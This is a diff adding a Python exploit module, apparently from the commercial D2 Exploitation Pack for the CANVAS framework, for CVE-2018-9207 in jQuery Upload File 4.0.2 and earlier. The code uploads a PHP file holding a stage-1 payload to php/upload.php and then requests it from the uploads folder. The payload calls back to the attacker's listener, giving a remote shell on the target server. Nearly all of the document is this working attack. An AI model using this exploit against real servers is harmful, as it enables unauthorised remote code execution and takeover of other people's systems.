@@ -1,0 +1,134 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2018
+#
+
+import sys
+import time
+import os
+import random
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from phplistener import get_php_stage1
+
+
+# GUI info
+NAME = "JQuery Upload File 4.0.2 Remote Code Execution Vulnerability"
+
+DESCRIPTION = "Remote Code Execution in jQuery Upload File php/upload.php"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Hayageek"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "<= 4.0.2"
+DOCUMENTATION["Date public"] = "2018.11.02"
+DOCUMENTATION["References"] = "http://www.vapidlabs.com/advisory.php?v=206"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "CVE-2018-9207"
+DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9207"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""  
+    self.basepath = "/"          
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 0
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.PHPMULTI]
+	
+  def upload_file(self):               
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+
+    # Upload PHP file            
+    params = '-----------------880735062871553\r\nContent-Disposition: form-data; name="myfile"; filename="d2.php"\r\n\r\n<?php %s ?>\r\n-----------------880735062871553--\r\n'%(self.get_php_to_mosdef())      
+
+    url = '/php/upload.php'            
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    ua.addHeader("Content-Type", "multipart/form-data; boundary=---------------880735062871553") 
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")       
+    data = ua.POST(mainurl, params)
+        
+    # Execute uploaded JSP file
+    url = "/php/uploads/d2.php"    
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    data = ua.GET(mainurl)    
+                		
+    return 1
+
+  def get_php_to_mosdef(self):
+    localhost = self.callback.ip
+    localport = self.callback.port    
+    badchars  = ""
+    ret = get_php_stage1(badchars,localhost,localport)
+
+    return ret
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)             
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
